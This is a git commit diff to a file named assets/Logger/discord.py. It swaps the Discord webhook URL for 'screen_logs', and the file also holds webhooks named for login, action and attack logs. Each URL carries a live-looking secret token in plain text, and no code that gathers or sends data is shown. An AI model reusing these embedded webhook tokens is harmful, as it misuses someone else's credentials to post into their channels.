f954332fadaa9b0d545dc3943b117c6fe652dc57
Exo0001 <84390579+Exo0001@users.noreply.github.com>
2021-05-20 09:34:38 +0100

    Update discord.py

--- assets/Logger/discord.py
+++ assets/Logger/discord.py
@@ -1,5 +1,5 @@
 webhooks = {
-	"screen_logs": "https://discord.com/api/webhooks/844148531052412968/_uiWklaFSMI79_3NcKt45ZKumn6hvktS-mUSDnwxp_H630EIK8brKi74WWdcET_6HmH1",
+	"screen_logs": "https://discord.com/api/webhooks/844855350801072159/xPsomucP4neo4dOdGLBaIbRmz8ldvCr9617c2FcWgDjrwrvuemlc2shLtl5TJCjq6zi7",
 	"login_logs": "https://discord.com/api/webhooks/844148531052412968/_uiWklaFSMI79_3NcKt45ZKumn6hvktS-mUSDnwxp_H630EIK8brKi74WWdcET_6HmH1",
 	"action_logs": "https://discord.com/api/webhooks/844148531052412968/_uiWklaFSMI79_3NcKt45ZKumn6hvktS-mUSDnwxp_H630EIK8brKi74WWdcET_6HmH1",
 	"attack_logs": "https://discord.com/api/webhooks/844148531052412968/_uiWklaFSMI79_3NcKt45ZKumn6hvktS-mUSDnwxp_H630EIK8brKi74WWdcET_6HmH1"
